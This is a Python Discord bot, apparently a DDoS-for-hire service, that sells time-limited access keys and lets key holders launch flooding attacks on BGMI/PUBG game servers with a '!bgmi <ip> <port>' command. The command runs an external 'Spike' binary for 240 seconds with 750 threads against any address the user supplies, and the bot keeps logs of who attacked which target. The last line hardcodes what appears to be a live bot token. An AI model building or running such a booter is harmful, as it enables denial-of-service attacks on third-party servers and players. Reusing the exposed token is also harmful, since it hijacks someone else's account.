import discord
from discord.ext import commands
import subprocess
import random
import string
import time
import asyncio
from datetime import datetime
import pytz
import os

# Global variables
attack_running = False
authorized_users = {}  # {user_id: {"expiry_time": expiry_time, "key": key, "redeem_time": redeem_time, "attacks": attack_count}}
keys = {}  # {key: expiry_time}
attack_logs = []  # List to store attack logs
all_users = set()  # Track all users who have interacted with the bot
waiting_users = set()  # Track users waiting for an attack to finish

# Define admin ID
ADMIN_ID = 801688645567381546  # Replace with your admin's Discord ID

# Define default values
DEFAULT_PACKET_SIZE = 12
DEFAULT_THREADS = 750
MAX_ATTACK_TIME = 240  # in seconds

# Kolkata timezone
KOLKATA_TZ = pytz.timezone('Asia/Kolkata')

# File paths
GENERATED_KEYS_FILE = "generated.txt"
REDEEMED_KEYS_FILE = "redeemed.txt"
LOGS_FILE = "logs.txt"
USERS_FILE = "users.txt"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

def clean_expired_users():
    current_time = time.time()
    expired_users = [user_id for user_id, details in authorized_users.items() if details["expiry_time"] <= current_time]
    for user_id in expired_users:
        del authorized_users[user_id]

def save_logs_to_file():
    with open(LOGS_FILE, "w") as log_file:
        for log in attack_logs:
            log_file.write(f"User ID: `{log['user_id']}` | Username: `{log['username']}` | Target: `{log['ip']}:{log['port']}` | Time: `{log['time']}`\n")

def read_logs_from_file():
    try:
        with open(LOGS_FILE, "r") as log_file:
            return log_file.readlines()
    except FileNotFoundError:
        return []

def read_users_from_file():
    try:
        with open(USERS_FILE, "r") as users_file:
            return users_file.readlines()
    except FileNotFoundError:
        return []

def save_generated_keys_to_file():
    with open(GENERATED_KEYS_FILE, "w") as keys_file:
        for key, expiry_time in keys.items():
            keys_file.write(f"{key}:{expiry_time}\n")

def save_redeemed_keys_to_file():
    with open(REDEEMED_KEYS_FILE, "a") as redeemed_file:
        for user_id, details in authorized_users.items():
            redeemed_file.write(f"{details['key']}:{details['redeem_time']}:{user_id}\n")

def generate_key(duration):
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    keys[key] = time.time() + duration
    save_generated_keys_to_file()
    return key

def parse_duration(duration_str):
    if 'hour' in duration_str:
        return int(duration_str.replace('hour', '')) * 3600
    elif 'day' in duration_str:
        return int(duration_str.replace('day', '')) * 86400
    return None

def remove_redeemed_key_from_generated(key):
    try:
        with open(GENERATED_KEYS_FILE, "r") as keys_file:
            lines = keys_file.readlines()
        
        updated_lines = [line for line in lines if not line.startswith(f"{key}:")]
        
        with open(GENERATED_KEYS_FILE, "w") as keys_file:
            keys_file.writelines(updated_lines)
    except FileNotFoundError:
        pass

def attack(ip, port, user_id):
    global attack_running

    try:
        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        attack_logs.append({
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "time": attack_time
        })

        if user_id in authorized_users:
            authorized_users[user_id]["attacks"] += 1

    finally:
        attack_running = False

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def start(ctx):
    user_id = ctx.author.id
    all_users.add(user_id)

    start_message = (
        "🚀 *Welcome to BGMI Attack Bot* 🚀\n\n"
        "⚡️ _A powerful tool to manage DDoS attacks for BGMI/PUBG servers_ ⚡️\n\n"
        "✨ **Key Features:**\n"
        "   • Start attacks with `!bgmi` command\n"
        "   • Key-based authorization system\n"
        "   • Admin controls for key generation\n"
        "   • Real-time attack monitoring\n\n"
        "🔧 **Commands:**\n"
        "   !help - Show all commands\n"
        "   !bgmi - Start attack\n"
        "   !redeem - Activate your key\n\n"
        "👑 **Bot Owner:** [TITAN OP](https://t.me/TITANOP24)\n"
        "⚙️ _Use this bot responsibly!_"
    )
    await ctx.send(start_message)

@bot.command()
async def help(ctx):
    help_message = (
        "🛠️ *Available Commands* 🛠️\n\n"
        "🎮 *Attack Commands:*\n"
        "`!bgmi <ip> <port>` - Start a new attack\n"
        "`!redeem <key>` - Redeem your access key\n\n"
        "🔑 *Admin Commands:*\n"
        "`!genkey <duration>` - Generate single key\n"
        "`!mgenkey <duration> <amount>` - Bulk generate keys\n"
        "`!users` - List authorized users\n"
        "`!logs` - Show attack logs\n"
        "`!broadcast <message>` - Broadcast message to all users\n\n"
        "ℹ️ *Info Commands:*\n"
        "`!start` - Show bot introduction\n"
        "`!help` - Display this message\n\n"
        "👨💻 *Developer:* [@TITANOP24](https://t.me/TITANOP24)\n"
        "🔒 _All attacks are logged and monitored_"
    )
    await ctx.send(help_message)

@bot.command()
async def bgmi(ctx, ip: str, port: int):
    global attack_running
    user_id = ctx.author.id

    if attack_running:
        waiting_users.add(user_id)
        await ctx.send('⏳ Another attack is running. Please wait for it to finish.')
        return

    if user_id not in authorized_users or time.time() > authorized_users[user_id]["expiry_time"]:
        await ctx.send('❌ You are not authorized. Redeem a key first.')
        return

    attack_running = True
    attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")

    attack_details = (
        f"🚀 **Attack Started!**\n\n"
        f"🎯 **Target IP:** `{ip}`\n"
        f"🚪 **Port:** `{port}`\n"
        f"⏰ **Duration:** `{MAX_ATTACK_TIME} seconds`\n"
        f"📅 **Time:** `{attack_time}`"
    )
    await ctx.send(attack_details)

    # Start the attack asynchronously
    asyncio.ensure_future(run_attack(ip, port, user_id, ctx))

async def run_attack(ip, port, user_id, ctx):
    global attack_running, waiting_users

    try:
        # Start the attack process
        process = subprocess.Popen(["./Spike", ip, str(port), str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])

        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        
        username = str(ctx.author)

        attack_logs.append({
            "user_id": user_id,
            "username": username,  
            "ip": ip,
            "port": port,
            "time": attack_time
        })

        if user_id in authorized_users:
            authorized_users[user_id]["attacks"] += 1

        # Wait for the attack duration
        await asyncio.sleep(MAX_ATTACK_TIME)

    except Exception as e:
        print(f"Error during attack: {e}")

    finally:
        # Ensure attack completion message is sent
        attack_running = False
        attack_finished_message = (
            f"✅ **Attack Finished!**\n\n"
            f"🎯 **Target IP:** `{ip}`\n"
            f"🚪 **Port:** `{port}`\n"
            f"⏰ **Duration:** `{MAX_ATTACK_TIME} seconds`\n"
            f"📅 **Time:** `{datetime.now(KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')}`"
        )

        await ctx.send(attack_finished_message)

        # Notify waiting users
        if waiting_users:
            for user in waiting_users:
                try:
                    await bot.get_user(user).send("🔔 The previous attack has finished. You can now start your attack!")
                except Exception as e:
                    print(f"Failed to notify user {user}: {e}")

            waiting_users.clear()

@bot.command()
async def genkey(ctx, duration: str):
    if ctx.author.id != ADMIN_ID:
        await ctx.send('❌ You are not authorized to use this command.')
        return

    duration_seconds = parse_duration(duration)
    if not duration_seconds:
        await ctx.send('❌ Invalid duration. Use format like 1hour, 2days, etc.')
        return

    key = generate_key(duration_seconds)
    await ctx.send(f'🔑 Generated key:\n\n`{key}`')

@bot.command()
async def mgenkey(ctx, duration: str, number: int):
    if ctx.author.id != ADMIN_ID:
        await ctx.send('❌ You are not authorized to use this command.')
        return

    duration_seconds = parse_duration(duration)
    if not duration_seconds:
        await ctx.send('❌ Invalid duration. Use format like 1hour, 2days, etc.')
        return

    keys_list = [generate_key(duration_seconds) for _ in range(number)]
    await ctx.send(f'🔑 Generated keys:\n\n' + '\n'.join([f'`{key}`' for key in keys_list]))

@bot.command()
async def block(ctx, key_to_block: str):
    if ctx.author.id != ADMIN_ID:
        await ctx.send('❌ You are not authorized to use this command.')
        return

    if key_to_block in keys:
        del keys[key_to_block]

    revoked_users = []
    for user_id, details in list(authorized_users.items()):
        if details["key"] == key_to_block:
            del authorized_users[user_id]
            revoked_users.append(str(ctx.guild.get_member(user_id)))

    if revoked_users:
        await ctx.send(
            f"🚫 **Key `{key_to_block}` has been blocked and access revoked for:**\n\n" + '\n\n'.join(revoked_users)
        )
    else:
        await ctx.send(f"✅ Key `{key_to_block}` has been blocked (No active users were using it).")

def save_users_to_file():
    with open(USERS_FILE, "w") as users_file:
        for user_id, details in authorized_users.items():
            expiry_time = datetime.fromtimestamp(details["expiry_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
            redeem_time = datetime.fromtimestamp(details["redeem_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
            user_info_str = f"User ID: `{user_id}` | Username: `{details.get('username', 'No Username')}` | Key: `{details['key']}` | Redeem Time: `{redeem_time}` | Expiry Time: `{expiry_time}` | Attacks Done: `{details['attacks']}`\n"
            users_file.write(user_info_str)

@bot.command()
async def users(ctx):
    if ctx.author.id != ADMIN_ID:
        await ctx.send('❌ You are not authorized to use this command.')
        return
    
    clean_expired_users()
    save_users_to_file()

    users_list = read_users_from_file()

    if not users_list:
        await ctx.send('No authorized users found.')
        return

    response = "📜 **Authorized Users:**\n\n"
    for user_line in users_list:
        try:
            user_id = user_line.split("User ID: `")[1].split("`")[0].strip()
            username = user_line.split("Username: `")[1].split("`")[0].strip()
            key = user_line.split("Key: `")[1].split("`")[0].strip()
            redeem_time = user_line.split("Redeem Time: `")[1].split("`")[0].strip()
            expiry_time = user_line.split("Expiry Time: `")[1].split("`")[0].strip()
            attacks_done = user_line.split("Attacks Done: `")[1].split("`")[0].strip()

            user_info = (
                f"👤 **User ID:** `{user_id}`\n"
                f"👤 **Username:** {username}\n"
                f"🔑 **Key:** `{key}`\n"
                f"⏰ **Redeem Time:** `{redeem_time}`\n"
                f"⏳ **Expiry Time:** `{expiry_time}`\n"
                f"🎯 **Attacks Done:** `{attacks_done}`\n\n"
            )
            response += user_info
        except IndexError:
            continue

    await ctx.send(response)

@bot.command()
async def redeem(ctx, key: str):
    user_id = ctx.author.id
    
    if user_id in authorized_users and time.time() < authorized_users[user_id]["expiry_time"]:
        expiry_time = datetime.fromtimestamp(authorized_users[user_id]["expiry_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
        await ctx.send(
            f"❌ You already have an active key that expires on `{expiry_time}`.\n"
            "You can only redeem a new key after the current one expires."
        )
        return
    
    current_time = time.time()
    
    if key not in keys or current_time > keys[key]:
        await ctx.send('❌ Invalid or expired key.')
        return

    username = str(ctx.author)
    
    authorized_users[user_id] = {
        "expiry_time": keys[key],
        "key": key,
        "redeem_time": current_time,
        "attacks": 0,
        "username": username
    }
    del keys[key]

    remove_redeemed_key_from_generated(key)

    save_users_to_file()

    with open(REDEEMED_KEYS_FILE, "a") as redeemed_file:
        redeemed_file.write(f"{key}:{current_time}:{user_id}\n")

    expiry_time = datetime.fromtimestamp(authorized_users[user_id]["expiry_time"], KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')
    await ctx.send(
        f"✅ Key redeemed successfully!\n"
        f"🔑 Key: `{key}`\n"
        f"⏳ Expiry: `{expiry_time}`\n\n"
        "You are now authorized to use `!bgmi`."
    )

@bot.command()
async def logs(ctx):
    if ctx.author.id != ADMIN_ID:
        await ctx.send('❌ You are not authorized to use this command.')
        return
    
    save_logs_to_file()
    logs_list = read_logs_from_file()
    
    if not logs_list:
        await ctx.send("📜 No attack logs found.")
        return

    response = "📜 **Attack Logs:**\n\n"
    for log in logs_list:
        try:
            user_id = log.split("User ID: `")[1].split("`")[0].strip()
            username = log.split("Username: `")[1].split("`")[0].strip()
            target = log.split("Target: `")[1].split("`")[0].strip()
            attack_time = log.split("Time: `")[1].split("`")[0].strip()

            log_entry = (
                f"👤 **User ID:** `{user_id}`\n"
                f"👤 **Username:** {username}\n"
                f"🎯 **Target:** `{target}`\n"
                f"📅 **Time:** `{attack_time}`\n\n"
            )
            response += log_entry
        except IndexError:
            continue

    await ctx.send(response)

@bot.command()
async def delete(ctx, file_type: str):
    if ctx.author.id != ADMIN_ID:
        await ctx.send('❌ You are not authorized to use this command.')
        return
    
    if file_type == "logs":
        open(LOGS_FILE, "w").close()
        attack_logs.clear()
        await ctx.send('✅ Logs have been cleared.')
    elif file_type == "users":
        open(USERS_FILE, "w").close()
        authorized_users.clear()
        await ctx.send('✅ Users list has been cleared.')
    else:
        await ctx.send('❌ Invalid argument. Use !delete logs or !delete users.')

@bot.command()
async def broadcast(ctx, *, message: str):
    if ctx.author.id != ADMIN_ID:
        await ctx.send('❌ You are not authorized to use this command.')
        return

    all_recipients = set(all_users) | set(authorized_users.keys())

    sent_count = 0
    for user_id in all_recipients:
        try:
            user = await bot.fetch_user(user_id)
            await user.send(f"📢 Broadcast:\n\n{message}")
            sent_count += 1
        except Exception as e:
            print(f"Failed to send broadcast to user {user_id}: {e}")

    await ctx.send(f'✅ Message broadcasted to {sent_count} users.')

async def dispose_unredeemed_keys():
    while True:
        current_time = time.time()
        unredeemed_keys = [key for key, expiry_time in keys.items() if current_time > expiry_time + 7200]  # 2 hours
        for key in unredeemed_keys:
            del keys[key]
        save_generated_keys_to_file()
        await asyncio.sleep(3600)  # Check every hour

bot.run('MTI0Mjc2MDY2OTY2NTk1NTkyMQ.GD2BxJ.EoAN37MHmwtIOHu_dt1sRXtiHhxdGizPHkuWS4')
